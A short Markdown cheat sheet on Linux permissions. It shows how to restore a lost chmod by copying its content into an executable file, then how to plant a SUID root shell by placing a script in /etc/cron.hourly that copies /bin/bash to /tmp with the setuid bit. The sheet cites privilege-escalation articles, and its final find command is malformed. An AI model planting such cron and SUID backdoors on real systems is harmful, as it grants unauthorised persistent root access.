# Intro

## Restore file permissions

* Find a file that has the required permisison
* Copy the exact file with permissions
* Find a file that has the required content e.g. chmod
* Copy the file content *without* permissions e.g. cat, dd

Example

```bash
chmod +x ./runme.py
bash: permission denied: chmod

ls -l ls
-rwxr-xr-x 1 root root 147176 Sep 24  2020 /usr/bin/ls

cp ls chmodfix
cat /usr/bin/chmod > chmodfix

ls -l chmodfix
-rwxr-xr-x 1 root root 64448 Sep 24  2020 chmodfix

./chmodfix +x ./runme.py
sudo ./chmodfix +x chmod
```

## Restore root shell using self-created SUID binary

* Create a script that copies /bin/bash and run chmod +xs on the copy
* Make the script executeable
* Copy into cron.hourly job
* Use find to execute created root shell
* from <https://medium.com/go-cyber/linux-privilege-escalation-with-suid-files-6119d73bc620>
* from <https://www.prplbx.com/resources/blog/linux-privilege-escalation-with-path-variable-suid-bit/>
* from <https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/>

```bash
cat > root_access
#!/bin/sh
cp /bin/bash /tmp/root_access
chmod +xs /tmp/root_access
CTRL+D

chmod +x root_access
cp root_access /etc/cron.hourly

# wait an 1 hour

/tmp/root_access -p
whoami
root
find root_access -e -exec “/bin/bash” -p \;
```
